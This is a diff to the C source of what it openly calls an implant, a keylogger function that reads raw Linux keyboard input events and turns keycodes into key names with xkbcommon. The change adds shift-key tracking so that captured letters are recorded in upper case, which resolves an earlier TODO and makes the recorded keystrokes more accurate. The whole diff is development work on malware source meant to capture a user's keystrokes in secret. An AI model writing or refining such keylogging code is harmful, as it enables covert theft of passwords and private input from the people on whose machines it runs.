@@ -7,6 +7,7 @@
 #include "implant.h"
 #include <alloca.h>
 #include <bits/types/struct_timeval.h>
+#include <linux/input-event-codes.h>
 #include <stddef.h>
 #include <string.h>
 #include <errno.h>
@@ -15,6 +16,7 @@
 #include <linux/input.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <stdbool.h>
 #include <xkbcommon/xkbcommon.h>
 
 
@@ -30,6 +32,7 @@ static int get_highest_fd(implant_t *instance) {
 
 static int log_keyboard(int fd, struct xkb_state *state) {
     struct input_event evt = {0};
+    static bool shift_pressed = false;
 
     ssize_t bytes_read = read(fd, &evt, sizeof(evt));
     if (bytes_read != sizeof(evt)) {
@@ -41,15 +44,25 @@ static int log_keyboard(int fd, struct xkb_state *state) {
         return ERROR;
     }
 
+    if (evt.type == EV_KEY && evt.value == KEY_RELEASED) {
+        if (evt.code == KEY_LEFTSHIFT || evt.code == KEY_RIGHTSHIFT) {
+            shift_pressed = false;
+            return SUCCESSFUL;
+        }
+    }
+
     if (evt.type == EV_KEY && evt.value == KEY_PRESSED) {
 
-        /*
-            TODO:
-            handle case where user presses on shift to add press a key
-        */
+        if (evt.code == KEY_LEFTSHIFT || evt.code == KEY_RIGHTSHIFT) {
+            shift_pressed = true;
+            return SUCCESSFUL;
+        }
 
         char key_description[256] = {0};
         xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, evt.code + 8);
+
+        if (shift_pressed)
+            keysym = xkb_keysym_to_upper(keysym);
 
         xkb_keysym_get_name(keysym, key_description, 256);
 
